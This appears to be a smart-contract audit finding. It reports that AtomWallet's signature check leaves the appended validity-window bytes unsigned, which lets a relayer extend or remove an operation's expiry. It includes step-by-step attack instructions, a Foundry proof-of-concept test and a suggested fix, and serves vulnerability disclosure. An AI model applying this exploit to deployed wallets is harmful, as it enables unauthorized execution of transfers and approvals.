  "body": "## Finding description and impact\n\n`AtomWallet._validateSignature()` supports a 77-byte signature format where the trailing 12 bytes encode\n`validUntil` and `validAfter`. However, those values are not included in the digest that is recovered with ECDSA.\nAs a result, any relayer can rewrite the validity window while reusing the same 65-byte signature and still pass\nsignature validation.\n\n## Vulnerability Details\n\nThe current validation flow parses `validUntil` and `validAfter` from the end of `userOp.signature`, then recovers\nthe signer from an EIP-191 hash of `userOpHash` alone:\n\n```solidity\n(uint48 validUntil, uint48 validAfter, bytes memory signature) =\n    _extractValidUntilAndValidAfterFromSignature(userOp.signature);\n\nbytes32 hash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n\n(address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) = ECDSA.tryRecover(hash, signature);\n...\nreturn _packValidationData(sigFailed, validUntil, validAfter);\n```\n\nThis is unsafe because ERC-4337 `userOpHash` does not include `userOp.signature`. The optional 12-byte suffix is\ntherefore entirely outside the signed payload unless the account explicitly re-hashes it before recovery.\n\nThe local tests construct the 77-byte format exactly this way: sign `userOpHash`, then append the time window\nafterward:\n\n```solidity\nbytes memory rawSignature = _signUserOpHash(signerPrivateKey, userOpHash);\nreturn abi.encodePacked(rawSignature, validUntil, validAfter);\n```\n\nAn attacker can exploit this as follows:\n\n1. Observe a signed `UserOperation` that was intended to expire quickly.\n2. Keep the original 65-byte ECDSA signature `(r, s, v)` unchanged.\n3. Replace the appended `validUntil`/`validAfter` bytes with attacker-chosen values.\n4. Submit the modified operation through the EntryPoint.\n\nBecause recovery still happens over the original `userOpHash`, `AtomWallet` accepts the signature and returns the\nattacker-controlled validity window in `validationData`.\n\n## Impact\n\nThis breaks the signer’s ability to constrain when a `UserOperation` is valid. A relayer can extend expiry,\nremove expiry, or move the start time without re-signing.\n\nFor value-moving operations, this can lead to unauthorized later execution of transfers, approvals, or arbitrary\nwallet calls after the signer expected the operation to have expired.root cause and impact(s) of this finding.\n\n## Recommended mitigation steps\nWhen the 77-byte format is used, bind `validUntil` and `validAfter` to the signed payload before recovering the\nsigner. One simple fix is:\n\n```solidity\nbytes32 signedHash = userOpHash;\nif (userOp.signature.length == 77) {\n    signedHash = keccak256(abi.encodePacked(userOpHash, validUntil, validAfter));\n}\n\nbytes32 hash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", signedHash));\n```",
  "proof_of_concept": "Create `tests/poc/AtomWalletUnsignedValidityWindow.t.sol` with the following test and run:\n\n```bash\nforge test --match-path tests/poc/AtomWalletUnsignedValidityWindow.t.sol -vv\n```\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.29;\n\nimport \"forge-std/src/Test.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { ValidationData, _parseValidationData } from \"@account-abstraction/core/Helpers.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\ncontract MockMultiVault {\n    address internal atomWarden;\n\n    constructor(address _atomWarden) {\n        atomWarden = _atomWarden;\n    }\n\n    function getAtomWarden() external view returns (address) {\n        return atomWarden;\n    }\n}\n\ncontract AtomWalletUnsignedValidityWindowPoC is Test {\n    function test_sameSignatureValidatesDifferentTimeWindows() external {\n        uint256 ownerKey = 0xA11CE;\n        address entryPoint = makeAddr(\"entryPoint\");\n        AtomWallet wallet = _deployWallet(vm.addr(ownerKey), entryPoint);\n        PackedUserOperation memory userOp = _emptyUserOp(address(wallet));\n        bytes32 userOpHash = keccak256(\"signed-user-op\");\n        bytes memory baseSignature = _signUserOpHash(ownerKey, userOpHash);\n\n        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);\n        ValidationData memory original =\n            _validate(wallet, entryPoint, userOp, userOpHash, baseSignature, originalValidUntil, 0);\n\n        assertEq(original.aggregator, address(0));\n        assertEq(original.validUntil, originalValidUntil);\n        assertEq(original.validAfter, 0);\n\n        vm.warp(originalValidUntil + 1);\n\n        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);\n        ValidationData memory mutated =\n            _validate(wallet, entryPoint, userOp, userOpHash, baseSignature, attackerValidUntil, 0);\n\n        assertEq(mutated.aggregator, address(0));\n        assertEq(mutated.validUntil, attackerValidUntil);\n        assertEq(mutated.validAfter, 0);\n        assertNotEq(original.validUntil, mutated.validUntil);\n    }\n\n    function _deployWallet(address owner, address entryPoint) internal returns (AtomWallet wallet) {\n        MockMultiVault multiVault = new MockMultiVault(owner);\n        AtomWallet walletImpl = new AtomWallet();\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(\n            address(walletImpl),\n            address(this),\n            abi.encodeWithSelector(AtomWallet.initialize.selector, entryPoint, address(multiVault), bytes32(\"ATOM\"))\n        );\n        return AtomWallet(payable(address(proxy)));\n    }\n\n    function _emptyUserOp(address sender) internal pure returns (PackedUserOperation memory) {\n        return PackedUserOperation({\n            sender: sender,\n            nonce: 0,\n            initCode: \"\",\n            callData: \"\",\n            accountGasLimits: bytes32(0),\n            preVerificationGas: 0,\n            gasFees: bytes32(0),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n    }\n\n    function _signUserOpHash(uint256 ownerKey, bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, digest);\n        return abi.encodePacked(r, s, v);\n    }\n\n    function _validate(\n        AtomWallet wallet,\n        address entryPoint,\n        PackedUserOperation memory userOp,\n        bytes32 userOpHash,\n        bytes memory baseSignature,\n        uint48 validUntil,\n        uint48 validAfter\n    )\n        internal\n        returns (ValidationData memory)\n    {\n        userOp.signature = abi.encodePacked(baseSignature, validUntil, validAfter);\n        vm.prank(entryPoint);\n        return _parseValidationData(wallet.validateUserOp(userOp, userOpHash, 0));\n    }\n}\n```\n\nThe test shows that the exact same 65-byte ECDSA signature is accepted for two different validity windows, proving\nthat the trailing metadata is not authenticated.",
